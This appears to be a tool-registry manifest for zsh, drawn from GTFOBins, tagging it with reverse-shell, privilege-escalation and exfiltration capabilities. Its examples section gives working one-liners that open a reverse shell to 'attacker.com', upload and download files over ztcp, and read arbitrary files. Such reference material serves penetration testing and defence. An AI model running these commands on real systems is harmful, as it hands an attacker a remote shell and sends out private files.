---
id: shell-zsh-zsh
namespace: shell:zsh:zsh
name: zsh
description: Z shell with advanced features; can execute commands, transfer data,
  read/write files, and spawn shells.
author: GTFOBins
version: 1.0.0
capabilities:
- network.transfer.download
- system.file.read
- system.file.write
- security.execution.reverse-shell
- security.privilege-escalation.shell
- network.transfer.upload
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- zsh
parameters: []
features:
- file-system
- interactive
- local
- network-intensive
- pipes-stdin
- process-manip
- requires-root
execution:
  template: zsh
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Download files (sudo, suid, unprivileged)
  command: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(<&$REPLY)"
    >/path/to/output-file'
- description: Read arbitrary files (sudo, suid, unprivileged)
  command: zsh -c 'echo "$(</path/to/input-file)"'
- description: Read arbitrary files (sudo, suid, unprivileged)
  command: zsh -c '</path/to/input-file'
- description: Write to arbitrary files (sudo, suid, unprivileged)
  command: zsh -c 'echo DATA >/path/to/output-file'
- description: Leverage less capabilities
  command: zsh -c '</etc/hosts'
- description: Send a reverse shell (sudo, suid, unprivileged)
  command: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;zsh >&$REPLY 2>&$REPLY
    0>&$REPLY'
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: zsh
- description: Upload files (sudo, suid, unprivileged)
  command: zsh -c 'zmodload zsh/net/tcp;ztcp attacker.com 12345;echo -n "$(</path/to/input-file)"
    >&$REPLY'
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/zsh/
techniques:
- collection
- exfiltration
- command-and-control
- execution
- privilege-escalation
install:
- method: apt
  package_name: zsh
  commands:
  - apt-get install -y zsh
---

# zsh

zsh is a command-line utility. Z shell with powerful features; can also download files, read arbitrary files, write to arbitrary files, send a reverse shell, spawn an interactive shell, upload files Can also leverage capabilities from: less.
